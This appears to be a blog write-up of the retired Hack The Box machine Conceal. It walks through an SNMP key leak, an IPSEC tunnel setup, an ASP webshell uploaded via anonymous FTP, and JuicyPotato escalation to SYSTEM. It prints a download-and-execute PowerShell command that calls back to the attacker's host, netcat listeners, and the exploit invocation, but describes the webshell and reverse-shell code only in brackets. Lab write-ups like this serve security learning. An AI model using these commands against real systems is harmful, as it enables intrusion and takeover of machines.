---
layout: post
title: "The Host Behind the Curtain"
subtitle: "HTB Conceal, where the machine hides every TCP port behind an IPSEC tunnel and then leaks the key to the tunnel in a sentence about itself"
date: 2019-05-25 12:00:00 +0000
description: "Conceal answers nothing on TCP until you build the VPN it told you the password to, then anonymous FTP drops a shell straight into the web root."
image: /assets/og/the-host-behind-the-curtain.png
tags: [hackthebox, writeup]
---

Conceal is a box that refuses to be seen. You scan all sixty-five thousand TCP ports and not one of them answers, which feels like a dead machine until you remember to knock on the other door. The UDP side is awake, and it is chatty in the worst possible way. One service leaks the host's own VPN password inside a note the admin wrote about themselves. You take that key, build an IPSEC tunnel by hand, and the moment the tunnel comes up the whole TCP face of the machine appears like a stage set rolled out from the wings. Behind the curtain there is anonymous FTP writing straight into the web root, a one-line shell, and a SYSTEM token waiting for anyone who already knows how to ask. The box is named for what it does. It hides everything in plain sight and then hands you the hiding place.

```
        C O N C E A L
        =============
        TCP :  all filtered. nobody home.
        UDP :  snmp  →  "my vpn psk is right here"
                          |
                          v
        you build the tunnel with its own key.
        the curtain lifts. 21, 80, 445 all step out.
                          |
                          v
        ftp drops your file into /upload.
        the browser runs it. the token does the rest.
                                                    隠
```

## 0x01 · the silent face

The first scan is a wall. Every TCP port comes back filtered, which is the network equivalent of a house with the lights off and the curtains drawn.

```
# nmap -sT -p- --min-rate 10000 10.10.10.116
All 65535 scanned ports on 10.10.10.116 are filtered
```

Most people would call that and move on. The trick is to remember that nmap, left to defaults, only ever knocks on the TCP door. There is a whole second set of doors on UDP, and almost nobody checks them because UDP scanning is slow and noisy and usually boring. Here it is the entire box. A UDP sweep wakes two services up.

```
# nmap -sU -sC --top-ports 20 10.10.10.116
PORT    STATE SERVICE
161/udp open  snmp
500/udp open  isakmp
```

Two tells in one line. Port 161 is SNMP, the protocol that lets network gear describe itself out loud. Port 500 is ISAKMP, the handshake half of IPSEC, which is to say the front gate of a VPN. Picture a building with no street-level doors at all, just an intercom on the wall and a tunnel entrance around the back. The TCP ports are the doors that do not exist yet. The VPN is the tunnel. And the intercom is about to read us the gate code.

## 0x02 · the intercom that overshares

SNMP runs on a thing called a community string, which is basically a password that everyone forgets to change. The default read string is `public`, and on Conceal it still is. Walk the tree.

```
# snmpwalk -v 2c -c public 10.10.10.116
...
SNMPv2-MIB::sysContact.0 = STRING: "IKE VPN password PSK -
    9C8B1A372B1878851BE2C097031B6E43"
SNMPv2-MIB::sysName.0    = STRING: Conceal
```

Read the contact field twice. An administrator wrote the VPN's pre-shared key into the field meant for "who do I call when this breaks," and SNMP hands it to anyone who says `public`. Think of it like a landlord taping the spare key to the mailbox and then writing "spare key is on the mailbox" on the mailbox. The value is not even the password itself. It is a hash, `9C8B1A372B1878851BE2C097031B6E43`, the kind of thing that looks scary until you drop it into a public lookup of already-cracked hashes and it falls out in one second.

```
9C8B1A372B1878851BE2C097031B6E43  →  Dudecake1!
```

There is more in the walk if you keep reading. The `snmp-netstat` and process scripts list out what the machine is running internally, including TCP listeners on 21, 80, and 445. The host is telling us its FTP and web and SMB services are alive and answering. We just cannot reach them yet, because the curtain is still down.

## 0x03 · building the tunnel by hand

Now we have a VPN password and a VPN gate, so we build the tunnel. First we ask the gate what kind of handshake it wants. `ike-scan` fingerprints the parameters the server will accept.

```
# ike-scan -M 10.10.10.116
10.10.10.116  Main Mode Handshake returned
    Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK
```

Those four values are the recipe. Picture a combination lock with four dials, and ike-scan just told us which numbers each dial has to land on: encryption is 3DES, hashing is SHA1, the key-exchange group is modp1024, and authentication is a pre-shared key, which is the `Dudecake1!` we just cracked. Get any dial wrong and the tunnel silently refuses to form. So we feed all four into strongSwan, the Linux IPSEC client, in two small config files.

The first holds the secret.

```
# /etc/ipsec.secrets
%any : PSK "Dudecake1!"
```

The second describes the connection, and the encryption line is just the ike-scan recipe written in strongSwan's dialect.

```
# /etc/ipsec.conf
conn conceal
    keyexchange=ikev1
    authby=secret
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    left=10.10.14.4
    right=10.10.10.116
    rightsubnet=10.10.10.116[tcp]
    auto=add
```

Restart the daemon and bring the connection up.

```
# ipsec restart
# ipsec up conceal
connection 'conceal' established successfully
```

That one line of output is the whole point of the box. The instant the tunnel forms, re-run the TCP scan that was a flat wall a section ago.

```
# nmap -sT -p- --min-rate 10000 10.10.10.116
21/tcp   open  ftp      Microsoft ftpd
80/tcp   open  http     Microsoft IIS httpd 10.0
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

The ports were never closed. They were behind a wall that only opens for traffic coming through the encrypted tunnel, and we are now inside it. The filtering was the lock, and the SNMP leak was the key sitting on top of it the whole time.

## 0x04 · the share that is also the website

Two services matter now. FTP on 21 and IIS on 80. The FTP server allows anonymous login, which means you can sign in with the username `anonymous` and no real password. On its own that is a place to read files. The dangerous combination shows up when you fuzz the website and find a directory.

```
# gobuster dir -u http://10.10.10.116 -w small.txt
/upload   (Status: 301)
```

There is an `/upload` folder on the web server. So the test writes itself. Drop a harmless text file over FTP, then ask for it in the browser.

```
ftp> put proof.txt iceberg.txt
# curl http://10.10.10.116/upload/iceberg.txt
hello from the ftp side
```

The file you wrote over FTP appears on the website. That confirms the FTP root and the web `/upload` directory are the same folder on disk. Picture a bookshop where the back-door delivery dock and the front-window display are the same shelf. Anything a courier drops at the loading dock is instantly in the window for any passerby to pick up and use. We are the courier, and the website is the passerby that will run whatever we leave.

Because IIS happily executes ASP, we leave a tiny one. I am describing it rather than printing it, on purpose. The literal string is short enough to fit in a tweet and it is the textbook backdoor, so the moment it touches disk any antivirus flags it as malware, which is the funniest possible proof of how dangerous one line can be.

```
# iceberg.asp
<% [ one-line ASP webshell: run the cmd query-string parameter via WScript.Shell ] %>
```

Upload it the same way, then drive it from the URL bar.

```
ftp> put iceberg.asp iceberg.asp
# curl "http://10.10.10.116/upload/iceberg.asp?cmd=whoami"
conceal\destitute
```

The web server ran our command as the user `destitute`. From there it is one step to a real interactive shell. Host a copy of a PowerShell reverse-shell script on your own machine and have the webshell pull it down and run it.

```
# curl "http://10.10.10.116/upload/iceberg.asp?cmd=
    powershell iex(New-Object Net.WebClient).downloadString(
    'http://10.10.14.4/iceberg.ps1')"
```

The script itself is just [ a PowerShell reverse shell calling back to 10.10.14.4 on 443 ]. Catch it on a listener and the prompt lands in your lap.

```
# nc -lnvp 443
connect to [10.10.14.4] from 10.10.10.116
PS C:\> type C:\Users\Destitute\Desktop\proof.txt
████████████████████████████████
```

## 0x05 · the privilege that was always there

`destitute` is a service-tier account, not an admin, and on a modern Windows box the first thing to check is what privileges the token carries. One line tells you everything.

```
PS C:\> whoami /priv
SeImpersonatePrivilege   Enabled
```

That single enabled privilege is a skeleton key on Windows, and it has been for years. SeImpersonate lets a process pretend to be another identity that connects to it. The classic abuse, named JuicyPotato, tricks a high-privilege Windows service into authenticating to a tiny server you control, then catches that incoming identity and wears it. Think of it like a coat-check counter. A very important person hands you their ticket, and instead of fetching their coat you simply put on the coat yourself and walk out as them. The important person here is a SYSTEM-level Windows component, and the coat is the SYSTEM token.

The tool needs a CLSID, which is just the unique serial number of the specific Windows service it tricks into connecting. You pick one that runs as SYSTEM on this exact build of Windows, point the tool at a batch file that fires your second shell, and let it swap coats.

```
PS C:\> jp.exe -t * -l 9001 -p C:\Users\Destitute\AppData\Local\Temp\rev.bat ^
    -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
[+] authresult 0
[+] CreateProcessWithTokenW OK
```

The `rev.bat` is just [ a batch one-liner that launches the same reverse shell back to 10.10.14.4 ]. Catch the new connection and read the name on the coat.

```
# nc -lnvp 443
PS C:\> whoami
nt authority\system
PS C:\> type C:\Users\Administrator\Desktop\proof.txt
████████████████████████████████
```

No exploit binary against the kernel, no memory corruption. The account simply held a privilege that, by design, can become SYSTEM, and nobody took the privilege away.

## 0x06 · the honest caveat

Conceal looks like a box about IPSEC, and the tunnel is the fun part, but the tunnel is not the lesson. The lesson is that the machine defeated its own concealment. Filtering every TCP port behind a VPN is genuinely good defense in depth. An attacker who cannot see a port cannot attack it, and that wall held perfectly. It held right up until the same machine read the VPN password aloud over a protocol with a default password of `public`. A lock is only as strong as the place you keep the key, and SNMP is the worst possible place, because SNMP exists specifically to tell strangers about the device. Putting a secret in `sysContact` is putting it on a billboard that points at the safe.

The rest of the box is the same shape in smaller costumes. Anonymous FTP is fine until its folder is also the web root, at which point "anyone can drop a file" quietly becomes "anyone can run code." SeImpersonate is a normal privilege for a service account until you realize it is one well-known tool away from SYSTEM. None of these is a zero-day. Each is a default left in place, a convenience that nobody walked back, a curtain with the cord hanging out where anyone can reach it. The strongest wall on the box was undone not by force but by the machine's own habit of describing itself. Real systems leak the same way. The config that documents the secret, the share that doubles as a server, the token that was always a little too powerful. Concealment fails the moment the thing you hid starts talking about where it is hidden.

## 0x07 · outro

```
the host turned off every light and locked every door,
then wrote the gate code on the wall in a note about itself.

you built its tunnel with its own key. the curtain lifted.
the loading dock was the front window. the token was a coat to borrow.

knock on the udp doors. never store the key in the lock. wear black.

                                                            EOF
```

---

*HTB: Conceal, retired 18 May 2019. A medium Windows box that is really a lecture on hiding a secret next to the lock it opens, wearing an IPSEC tunnel as a disguise. The curtain only lifts in a lab and nowhere you do not own.*